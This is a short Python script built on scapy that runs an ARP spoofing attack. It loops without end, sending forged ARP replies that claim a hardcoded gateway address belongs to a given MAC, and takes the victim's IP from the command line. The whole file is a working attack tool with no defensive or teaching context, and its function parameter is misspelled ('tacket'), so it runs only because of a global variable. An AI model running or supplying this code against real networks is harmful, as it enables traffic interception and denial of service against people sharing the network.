import time
import sys

from scapy.all import *

def ARPAttack(tacket, mac='78:45:c4:3b:b9:55',gateway='10.103.90.1'):
	request = 1
	victim = target
	spoof = gateway
	mac = mac
	# eth  = Ether(src='')
	arp = ARP(op=request, psrc=spoof,pdst=victim, hwsrc=mac)
	# pkt = eth/arp
	while 1:
		send(arp)
		time.sleep(.1)

if __name__ == "__main__":
	target = sys.argv[1]
	ARPAttack(target)
